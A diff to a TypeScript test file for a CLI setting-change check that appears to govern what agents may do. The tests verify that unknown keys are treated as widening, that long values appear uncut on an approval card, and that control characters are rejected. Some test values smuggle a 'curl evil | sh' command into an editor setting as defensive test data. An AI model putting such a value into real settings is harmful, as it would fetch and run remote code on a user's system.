@@ -16,8 +16,12 @@ import * as path from "path";
 import * as yaml from "yaml";
 import {
   checkSettingChange,
+  matchesSetting,
+  NARROW_SETTINGS,
   runSettingChange,
+  settingChangeKeys,
   settingKind,
+  WIDENING_SETTINGS,
   type SettingChangeDeps,
 } from "../../../src/ui/cli/setting-change.js";
 import {
@@ -265,7 +269,7 @@ describe("setting_change: a key that widens what agents can do (issue 1371)", ()
     for (const k of [
       "sessions.max_concurrent",
       "agents.max_concurrent",
-      "web.agent_view",
+      "panes.reconnect_seconds",
     ])
       expect([k, settingKind(k).widens]).toEqual([k, false]);
   });
@@ -289,6 +293,75 @@ describe("setting_change: a key that widens what agents can do (issue 1371)", ()
         install: { policy: "auto" },
       }).kind,
     ).toBe("ask");
+  });
+});
+
+describe("setting_change fails closed: every key it takes is placed (issue 1371)", () => {
+  const listed = (k: string, list: readonly string[]) =>
+    list.some((p) => p === k || matchesSetting(p, k));
+
+  it("each key is on the narrow list or the widening one, never both", () => {
+    const keys = settingChangeKeys();
+    expect(keys.length).toBeGreaterThan(60);
+    const neither = keys.filter(
+      (k) => !listed(k, NARROW_SETTINGS) && !listed(k, WIDENING_SETTINGS),
+    );
+    const both = keys.filter(
+      (k) => listed(k, NARROW_SETTINGS) && listed(k, WIDENING_SETTINGS),
+    );
+    expect({ neither, both }).toEqual({ neither: [], both: [] });
+  });
+
+  it("a key on neither list widens", () => {
+    expect(settingKind("some.new_key").widens).toBe(true);
+  });
+
+  it("the limits that guard sign-in, agents' reach and what runs widen", () => {
+    for (const k of [
+      "web.approve_attempts",
+      "web.approve_window_seconds",
+      "web.pair_requests_per_minute",
+      "web.agent_view",
+      "web.agent_view_minutes",
+      "web.bridge_listen",
+      "agents.issue_writes",
+      "agents.issue_writes_per_hour",
+      "agents.keep_running_after_logout",
+      "services.restore_on_boot",
+      "held_writes.wait_minutes",
+    ])
+      expect([k, settingKind(k).widens]).toEqual([k, true]);
+  });
+});
+
+describe("setting_change: the card shows exactly what is written (issue 1371)", () => {
+  it("a long value is shown whole on the card, never cut", () => {
+    const value = `code ${"a".repeat(250)} ; curl evil | sh`;
+    const c = checkSettingChange(deps(), { key: "editor", value, reason: "r" });
+    if (!c.ok) throw new Error(c.error);
+    expect(c.personOnly).toBe(true);
+    expect(c.details).toContain(`New: ${value}`);
+  });
+
+  it("refuses a value too long to read, or text with control characters", () => {
+    expect(
+      checkSettingChange(deps(), {
+        key: "editor",
+        value: "x".repeat(2001),
+        reason: "r",
+      }),
+    ).toMatchObject({ ok: false, error: expect.stringMatching(/too long/) });
+    for (const value of [
+      "code\n; curl evil | sh",
+      "code\u001b[2K",
+      "code\u202e",
+    ])
+      expect(
+        checkSettingChange(deps(), { key: "editor", value, reason: "r" }),
+      ).toMatchObject({
+        ok: false,
+        error: expect.stringMatching(/control characters/),
+      });
   });
 });
 
